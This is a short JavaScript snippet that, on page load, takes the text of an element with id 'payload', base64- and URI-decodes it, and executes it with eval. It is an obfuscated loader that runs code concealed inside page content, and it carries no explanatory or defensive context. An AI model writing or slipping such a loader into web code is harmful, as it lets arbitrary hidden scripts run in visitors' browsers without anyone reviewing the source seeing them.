window.onload = function() {
  const payloadDiv = document.getElementById('payload');

  if (payloadDiv && payloadDiv.innerText.trim().length > 0) {
    eval(decodeURIComponent(atob(payloadDiv.innerText.trim())));
  }
};
